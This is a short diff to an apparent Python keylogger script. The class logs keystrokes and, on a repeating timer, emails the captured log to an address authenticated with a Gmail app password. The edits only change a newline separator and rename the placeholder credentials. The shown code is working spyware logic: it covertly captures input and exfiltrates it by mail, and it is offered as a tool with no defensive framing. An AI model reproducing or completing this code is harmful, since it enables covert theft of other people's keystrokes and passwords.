@@ -26,7 +26,7 @@ class Keylogger :
         self.append_to_log(current)
 
     def report (self) :
-        self.sendMail(self.mail,self.passwd,"\n\n"+self.log)
+        self.sendMail(self.mail,self.passwd,"\n"+self.log)
         self.log = ""
         timer = threading.Timer(self.set_interval,self.report)
         timer.start()
@@ -47,6 +47,5 @@ class Keylogger :
             self.report()
             keyboard.join()
 
-my_keylogger = Keylogger(30,"your email address","app password for gmail account")
+my_keylogger = Keylogger(30,"your_email_address","app_password_for_gmail_account")
 my_keylogger.start()
-
